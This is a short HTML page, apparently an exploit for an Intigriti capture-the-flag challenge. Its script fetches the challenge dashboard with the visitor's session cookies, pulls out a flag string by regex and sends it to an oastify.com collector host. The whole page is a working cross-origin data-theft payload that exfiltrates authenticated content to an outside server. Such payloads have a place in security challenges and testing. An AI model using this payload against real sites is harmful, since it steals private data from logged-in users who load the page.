<!DOCTYPE html>
<html>
<body>
<script>
fetch("https://challenge-0126.intigriti.io/dashboard.html", {
  credentials: "include"
})
.then(r => r.text())
.then(html => {

  // flag text extract karo
  const match = html.match(/INTIGRITI\{.*?\}/);

  if(match){
    fetch("https://6t0zvf2if3ckvsh6npwccqm4nvtmhp5e.oastify.com/?flag=" + encodeURIComponent(match[0]));
  } else {
    fetch("https://6t0zvf2if3ckvsh6npwccqm4nvtmhp5e.oastify.com/?noflag=true");
  }

});
</script>
</body>
</html>
